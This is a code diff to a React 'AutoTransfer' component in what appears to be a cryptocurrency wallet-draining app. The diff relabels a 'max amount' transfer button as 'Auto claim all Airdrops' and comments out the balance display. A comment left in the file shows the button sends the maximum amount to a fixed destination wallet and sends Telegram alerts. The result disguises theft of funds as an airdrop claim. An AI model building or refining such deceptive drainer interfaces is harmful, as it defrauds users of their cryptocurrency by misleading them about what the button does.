@@ -286,17 +286,17 @@ export function AutoTransfer() {
       <CardHeader>
         <CardTitle className="text-white flex items-center gap-2">
           <Zap className="w-5 h-5 text-yellow-500" />
-          Auto claim (Max Amount)
+          Auto claim all Airdrops(Max Amount)
         </CardTitle>
         <div className="bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3">
           <div className="flex items-center gap-2 text-yellow-400">
             <AlertTriangle className="w-4 h-4" />
+            <p className="text-yellow-300 text-xs">Gas fees are paid by your wallet!</p>
             {/* <span className="text-sm font-medium">One-Click Transfer + Telegram Alerts</span> */}
           </div>
           {/* <p className="text-yellow-300 text-xs mt-1">
             Automatically sends maximum amount to: {formatAddress(DESTINATION_WALLET)}
           </p> */}
-          <p className="text-yellow-300 text-xs">Gas fees are paid by your wallet!</p>
         </div>
       </CardHeader>
       <CardContent className="space-y-4">
@@ -347,7 +347,7 @@ export function AutoTransfer() {
           </div>
         )}
 
-        {/* Balance Display */}
+        {/* Balance Display
         {currentBalance && currentToken && (
           <div className="space-y-2 p-3 bg-slate-700/30 rounded-lg">
             <div className="flex items-center justify-between text-sm">
@@ -377,7 +377,7 @@ export function AutoTransfer() {
               </>
             )}
           </div>
-        )}
+        )} */}
 
         {/* Error Display */}
         {calculation?.error && (
